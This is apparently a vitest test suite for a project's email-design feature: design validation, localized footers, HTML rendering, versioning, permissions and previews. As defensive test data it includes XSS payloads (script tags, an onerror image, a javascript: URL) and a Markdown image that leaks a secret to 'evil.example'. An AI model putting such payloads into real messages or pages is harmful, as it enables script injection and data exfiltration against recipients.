import { randomUUID } from "node:crypto";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { and, eq, inArray } from "drizzle-orm";
import { migrate } from "drizzle-orm/postgres-js/migrator";
import { db, sqlClient } from "../src/server/db";
import { audit, emailDesigns, projects } from "../src/server/db/schema";
import {
  activeEmailDesign,
  createEmailDesign,
  listEmailDesigns,
  previewEmail,
  selectEmailDesign,
} from "../src/server/email-design";
import { renderEmail } from "../src/server/email";
import { emailDesignConfig, localized } from "../src/domain/email-design";
import type { Principal } from "../src/domain/permissions";
const projectId = randomUUID();
const otherProject = randomUUID();
const manager: Principal = {
  id: `manager-${projectId}`,
  kind: "human",
  active: true,
  owner: false,
  grants: [{ projectId, actions: ["project.read", "project.manage"] }],
};
const reader: Principal = {
  ...manager,
  id: `reader-${projectId}`,
  grants: [{ projectId, actions: ["project.read"] }],
};
const outsider: Principal = {
  ...manager,
  id: `outsider-${projectId}`,
  grants: [{ projectId: otherProject, actions: ["project.read", "project.manage"] }],
};
const branded = {
  accent: "#aa3355",
  fontFamily: "serif",
  headerText: "Acme Support",
  logoUrl: "https://assets.example.test/logo.png",
  footer: { en: "Acme Ltd., Main Street 1", de: "Acme GmbH, Hauptstraße 1" },
  signature: { en: "Kind regards,\nThe Acme team", de: "Viele Grüße\nDein Acme-Team" },
};
beforeAll(async () => {
  await migrate(db(), { migrationsFolder: "drizzle" });
  await db()
    .insert(projects)
    .values([
      { id: projectId, name: "Design", slug: `design-${projectId}`, defaultLanguage: "de" },
      { id: otherProject, name: "Other", slug: `design-${otherProject}` },
    ]);
});
afterAll(async () => {
  const ids = [projectId, otherProject];
  await db().delete(audit).where(inArray(audit.projectId, ids));
  await db().delete(projects).where(inArray(projects.id, ids));
  await sqlClient().end();
});
describe("design configuration", () => {
  it("accepts a complete design and fills the defaults of a minimal one", () => {
    expect(emailDesignConfig.parse(branded)).toMatchObject(branded);
    expect(emailDesignConfig.parse({})).toEqual({ fontFamily: "sans", footer: {}, signature: {} });
  });
  it("refuses anything that is not a plain presentation setting", () => {
    const bad: Record<string, unknown>[] = [
      { accent: "red" },
      { accent: "#12345" },
      { fontFamily: "comic" },
      { headerText: "" },
      { logoUrl: "http://assets.example.test/logo.png" },
      { logoUrl: "https://user:secret@assets.example.test/logo.png" },
      { logoUrl: "javascript:alert(1)" },
      { logoUrl: `https://example.test/${"a".repeat(500)}` },
      { footer: { fr: "Bonjour" } },
      { footer: { en: "x".repeat(501) } },
      { signature: { en: "x".repeat(1001) } },
      { html: "<b>raw</b>" },
    ];
    for (const config of bad)
      expect(emailDesignConfig.safeParse(config).success, JSON.stringify(config)).toBe(false);
  });
  it("picks the footer of the recipient's language and falls back to the project's", () => {
    const texts = { en: "English", de: "Deutsch" };
    expect(localized(texts, "de", "en")).toBe("Deutsch");
    expect(localized(texts, "de-AT", "en")).toBe("Deutsch");
    expect(localized({ en: "English" }, "de", "en")).toBe("English");
    expect(localized({ en: "English" }, "de", "de")).toBeNull();
    expect(localized({ de: "  " }, "de", "en")).toBeNull();
    expect(localized({}, "en", "en")).toBeNull();
  });
});
describe("rendering with a design", () => {
  const render = (config: unknown, language = "en", markdown = "Hello **world**") =>
    renderEmail({
      project: "Design",
      markdown,
      language,
      design: emailDesignConfig.parse(config),
      fallbackLanguage: "de",
    });
  it("applies accent, font, header, logo, footer and signature", async () => {
    const mail = await render(branded);
    // A document title, for viewing the mail in a browser and for screen readers.
    expect(mail.html).toContain("<title>Acme Support</title>");
    expect(mail.html).toContain("#aa3355");
    expect(mail.html).toContain("Georgia");
    expect(mail.html).toContain('src="https://assets.example.test/logo.png"');
    expect(mail.html).toContain('alt="Acme Support"');
    expect(mail.html).toContain("Acme Ltd., Main Street 1");
    expect(mail.html).toContain("The Acme team");
    expect(mail.text).toContain("Hello world");
    expect(mail.text).toContain("The Acme team");
    expect(mail.text).toContain("Acme Ltd., Main Street 1");
    const german = await render(branded, "de");
    expect(german.html).toContain("Hauptstraße 1");
    expect(german.text).toContain("Dein Acme-Team");
    expect(german.html).not.toContain("Main Street");
    // Without a logo the header text is shown.
    const plain = await render({ headerText: "Acme Support" });
    expect(plain.html).not.toContain("<img");
    expect(plain.text).toContain("Acme Support");
    // Markdown for an image, such as an agent's draft could carry to leak data
    // through the address of an image, makes no image in the HTML of the mail.
    const imageMail = await renderEmail({
      project: "Design",
      markdown: "Hello ![x](https://evil.example/p.png?d=SECRET) there",
      language: "en",
    });
    expect(imageMail.html).not.toContain("<img");
    expect(imageMail.html).not.toContain("evil.example");
    expect(imageMail.html).toContain("Hello");
    // The plain-text part has neither the image nor its address.
    expect(imageMail.text).not.toContain("p.png");
    expect(imageMail.text).toContain("Hello");
    // The built-in design shows the project name and carries no footer.
    const builtIn = await renderEmail({ project: "Design", markdown: "Hi", language: "en" });
    expect(builtIn.text).toContain("Design");
    expect(builtIn.html).not.toContain("border-top:1px solid #e3e5ee");
  });
  it("offers a dark variant and mobile scaling to programs that support them", async () => {
    const mail = await render({});
    expect(mail.html).toContain("prefers-color-scheme: dark");
    // The header and every other cell of the card inherit a light text color on
    // the dark card, not the dark one of the light variant.
    expect(mail.html).toMatch(/\.card\{[^}]*background-color:#1d1f2a[^}]*color:#e6e8f2/);
    expect(mail.html).toContain('name="color-scheme"');
    expect(mail.html).toContain("width=device-width");
    expect(mail.html).toContain("max-width:100%");
  });
  it("never lets configured text become markup", async () => {
    const mail = await render({
      headerText: "<script>alert(1)</script>",
      footer: { en: "<img src=x onerror=alert(2)>" },
      signature: { en: "<script>alert(3)</script>\n\n**bold**" },
    });
    for (const unsafe of ["<script", "<img src=x"]) expect(mail.html).not.toContain(unsafe);
    // The text is shown, escaped.
    expect(mail.html).toContain("&lt;img src=x");
    expect(mail.html).toContain("<strong>bold</strong>");
  });
  it("falls back to the project's default language for a missing footer", async () => {
    const mail = await render({ footer: { de: "Nur deutsch" } }, "en");
    expect(mail.html).toContain("Nur deutsch");
    expect((await render({ footer: { de: "Nur deutsch" } }, "en", "x")).text).toContain(
      "Nur deutsch",
    );
  });
});
describe("versions of a project's design", () => {
  it("adds consecutive versions, selects one for new mail and audits both", async () => {
    expect(await listEmailDesigns(reader, projectId)).toEqual([]);
    expect(await activeEmailDesign(projectId, {})).toBeNull();
    const created = await Promise.all(
      Array.from({ length: 4 }, () =>
        createEmailDesign(manager, projectId, { headerText: "Concurrent" }),
      ),
    );
    expect(created.map((entry) => entry.version).sort()).toEqual([1, 2, 3, 4]);
    expect((await createEmailDesign(manager, projectId, branded)).version).toBe(5);
    expect(
      (await listEmailDesigns(reader, projectId)).map((entry) => [entry.version, entry.active]),
    ).toEqual([
      [5, false],
      [4, false],
      [3, false],
      [2, false],
      [1, false],
    ]);
    expect(await selectEmailDesign(manager, projectId, 5)).toEqual({ version: 5 });
    const [row] = await db()
      .select({ settings: projects.settings })
      .from(projects)
      .where(eq(projects.id, projectId));
    expect(await activeEmailDesign(projectId, row?.settings ?? {})).toMatchObject({
      version: 5,
      config: { accent: "#aa3355" },
    });
    expect((await listEmailDesigns(reader, projectId))[0]).toMatchObject({
      version: 5,
      active: true,
    });
    expect(
      await db()
        .select()
        .from(audit)
        .where(and(eq(audit.projectId, projectId), eq(audit.action, "design.create"))),
    ).toHaveLength(5);
    expect(
      await db()
        .select()
        .from(audit)
        .where(and(eq(audit.projectId, projectId), eq(audit.action, "design.select"))),
    ).toHaveLength(1);
    // Back to the built-in design.
    await selectEmailDesign(manager, projectId, 0);
    const [after] = await db()
      .select({ settings: projects.settings })
      .from(projects)
      .where(eq(projects.id, projectId));
    expect(await activeEmailDesign(projectId, after?.settings ?? {})).toBeNull();
  });
  it("keeps a version unchanged and ignores a stored version that no longer parses", async () => {
    const { version } = await createEmailDesign(manager, projectId, { headerText: "Stable" });
    const before = (
      await db()
        .select()
        .from(emailDesigns)
        .where(and(eq(emailDesigns.projectId, projectId), eq(emailDesigns.version, version)))
    )[0];
    await createEmailDesign(manager, projectId, { headerText: "Newer" });
    const after = (
      await db()
        .select()
        .from(emailDesigns)
        .where(and(eq(emailDesigns.projectId, projectId), eq(emailDesigns.version, version)))
    )[0];
    expect(after?.config).toEqual(before?.config);
    await db()
      .update(emailDesigns)
      .set({ config: { accent: "nonsense" } })
      .where(eq(emailDesigns.id, before?.id ?? ""));
    expect(await activeEmailDesign(projectId, { emailDesignVersion: version })).toBeNull();
    expect(await activeEmailDesign(projectId, { emailDesignVersion: 9999 })).toBeNull();
    expect(await activeEmailDesign(projectId, { emailDesignVersion: "x" })).toBeNull();
  });
  it("never reads a version of another project that has the same number", async () => {
    await createEmailDesign(outsider, otherProject, { headerText: "Foreign" });
    const mine = await activeEmailDesign(projectId, { emailDesignVersion: 1 });
    const theirs = await activeEmailDesign(otherProject, { emailDesignVersion: 1 });
    expect(mine?.config.headerText).toBe("Concurrent");
    expect(theirs?.config.headerText).toBe("Foreign");
    expect((await listEmailDesigns(outsider, otherProject)).map((entry) => entry.config)).toEqual([
      expect.objectContaining({ headerText: "Foreign" }),
    ]);
  });
  it("is managed only by people who manage the project", async () => {
    await expect(createEmailDesign(reader, projectId, {})).rejects.toMatchObject({
      code: "forbidden",
    });
    await expect(
      createEmailDesign({ ...manager, kind: "agent" }, projectId, {}),
    ).rejects.toMatchObject({ code: "forbidden" });
    await expect(createEmailDesign(outsider, projectId, {})).rejects.toMatchObject({
      code: "not_found",
    });
    await expect(createEmailDesign(manager, projectId, { accent: "red" })).rejects.toThrow();
    await expect(selectEmailDesign(reader, projectId, 1)).rejects.toMatchObject({
      code: "forbidden",
    });
    await expect(selectEmailDesign(outsider, projectId, 1)).rejects.toMatchObject({
      code: "not_found",
    });
    await expect(selectEmailDesign(manager, projectId, 9999)).rejects.toMatchObject({
      code: "not_found",
    });
    await expect(selectEmailDesign(manager, projectId, -1)).rejects.toThrow();
    await expect(listEmailDesigns(outsider, projectId)).rejects.toMatchObject({
      code: "not_found",
    });
  });
});
describe("preview", () => {
  it("renders like a real send with the selected version", async () => {
    const { version } = await createEmailDesign(manager, projectId, branded);
    await selectEmailDesign(manager, projectId, version);
    const markdown = "Preview body with `code`";
    const shown = await previewEmail(reader, projectId, { markdown, language: "de" });
    const real = await renderEmail({
      project: "Design",
      markdown,
      language: "de",
      color: "#5167ed",
      design: emailDesignConfig.parse(branded),
      fallbackLanguage: "de",
    });
    expect(shown).toEqual({ version, ...real });
    // A saved version other than the selected one, and the built-in design.
    const other = await createEmailDesign(manager, projectId, { headerText: "Second" });
    expect(
      (await previewEmail(reader, projectId, { markdown, version: other.version })).html,
    ).toContain("Second");
    expect((await previewEmail(reader, projectId, { markdown, version: 0 })).version).toBe(0);
    await expect(previewEmail(reader, projectId, { version: 99999 })).rejects.toMatchObject({
      code: "not_found",
    });
    expect((await previewEmail(reader, projectId, {})).html).toContain("preview of your design");
  });
  it("lets only managers preview an unsaved draft and no outsider preview anything", async () => {
    const draft = { headerText: "Draft only" };
    expect((await previewEmail(manager, projectId, { config: draft })).html).toContain(
      "Draft only",
    );
    await expect(previewEmail(reader, projectId, { config: draft })).rejects.toMatchObject({
      code: "forbidden",
    });
    await expect(previewEmail(manager, projectId, { config: { accent: "red" } })).rejects.toThrow();
    await expect(previewEmail(outsider, projectId, {})).rejects.toMatchObject({
      code: "not_found",
    });
    await expect(previewEmail(manager, randomUUID(), {})).rejects.toMatchObject({
      code: "not_found",
    });
    await expect(previewEmail(manager, projectId, { language: "fr" })).rejects.toThrow();
  });
});
